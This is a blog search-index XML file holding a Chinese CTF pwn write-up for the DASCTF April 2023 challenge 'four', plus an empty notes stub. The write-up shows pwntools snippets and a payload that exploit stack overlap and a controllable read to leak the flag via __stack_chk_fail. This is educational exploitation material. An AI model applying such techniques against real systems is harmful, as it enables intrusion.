<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>DASCTF-2023-4月赛</title>
    <link href="/2023/04/26/DASCTF-2023-4%E6%9C%88%E8%B5%9B/"/>
    <url>/2023/04/26/DASCTF-2023-4%E6%9C%88%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h1 id="DASCTF-2023-四月赛"><a href="#DASCTF-2023-四月赛" class="headerlink" title="DASCTF 2023 四月赛"></a>DASCTF 2023 四月赛</h1><span id="more"></span><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="four"><a href="#four" class="headerlink" title="four"></a>four</h3><p>逆向过程不多赘述，官方WP写的很清晰了。</p><h4 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h4><p>主要就是一个可以控制三个参数的<code>read</code><br><img src="/DASCTF-2023-4%E6%9C%88%E8%B5%9B/image-20230426153056822.png" alt="image-20230426153056822"><br>以及这个<code>open</code><br><img src="/DASCTF-2023-4%E6%9C%88%E8%B5%9B/image-20230426153158193.png" alt="image-20230426153158193"></p><h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><h5 id="覆盖"><a href="#覆盖" class="headerlink" title="覆盖"></a>覆盖</h5><p>在此处可以写入大量<code>flag</code>字符串，来让open是打开的就是flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">p.recvuntil(<span class="hljs-string">b&quot;You can give any value, trust me, there will be no overflow&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">0x5f04</span>))<br>p.recvuntil(<span class="hljs-string">b&quot;Actually, this function doesn&#x27;t seem to be useful&quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;aa&quot;</span> + <span class="hljs-string">b&quot;flag\x00&quot;</span> * <span class="hljs-number">0x1300</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Really?&quot;</span>)<br>p.send(<span class="hljs-string">&quot;n&quot;</span>)<br></code></pre></td></tr></table></figure><p><img src="/DASCTF-2023-4%E6%9C%88%E8%B5%9B/image-20230426154457318.png" alt="image-20230426154457318"></p><p>传入后</p><p><img src="/DASCTF-2023-4%E6%9C%88%E8%B5%9B/image-20230426154542414.png" alt="image-20230426154542414"></p><h5 id="打开"><a href="#打开" class="headerlink" title="打开"></a>打开</h5><p>再使用open<br><img src="/DASCTF-2023-4%E6%9C%88%E8%B5%9B/image-20230426154825175.png" alt="image-20230426154825175"><br>可以看到未初始化的open参数变成了<code>flag</code>，算一下差值,可以看到是<code>0x5de0</code>是小于传入的<code>0x5f04</code>，所以栈空间发生了重叠。</p><h5 id="读取"><a href="#读取" class="headerlink" title="读取"></a>读取</h5><p>来到可控read的部分<br>传入payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = <span class="hljs-string">b&quot;~3&gt;:&quot;</span>+<span class="hljs-string">b&quot;\x60\x21\x21&quot;</span>+<span class="hljs-string">b&quot;&gt;&quot;</span>+<span class="hljs-string">b&quot;@a*&gt;&quot;</span><br></code></pre></td></tr></table></figure><p>就把<code>flag</code>读到了<code>bss</code>段上。<br><img src="/DASCTF-2023-4%E6%9C%88%E8%B5%9B/image-20230426155133407.png" alt="image-20230426155133407"></p><p><img src="/DASCTF-2023-4%E6%9C%88%E8%B5%9B/image-20230426155219650.png" alt="image-20230426155219650"></p><h5 id="获取flag"><a href="#获取flag" class="headerlink" title="获取flag"></a>获取flag</h5><p>此时再去触发<code>__stack_chk_fail</code></p><p><img src="/DASCTF-2023-4%E6%9C%88%E8%B5%9B/image-20230426155343242.png" alt="image-20230426155343242"></p><p><img src="/DASCTF-2023-4%E6%9C%88%E8%B5%9B/image-20230426155443393.png" alt="image-20230426155443393"></p><p>就可以获取flag啦</p><p><img src="/DASCTF-2023-4%E6%9C%88%E8%B5%9B/image-20230426155528963.png" alt="image-20230426155528963"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>PWN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>复现</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTF-PWN一些题目的随记</title>
    <link href="/2023/04/19/test-blog/"/>
    <url>/2023/04/19/test-blog/</url>
    
    <content type="html"><![CDATA[<blockquote><p>记录一些知识点，需要的时候回来看看</p></blockquote><span id="more"></span><h3 id="NSSCTF-Round9"><a href="#NSSCTF-Round9" class="headerlink" title="NSSCTF Round9"></a>NSSCTF Round9</h3><h4 id="MyMem"><a href="#MyMem" class="headerlink" title="MyMem"></a>MyMem</h4>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>PWN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>随记</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
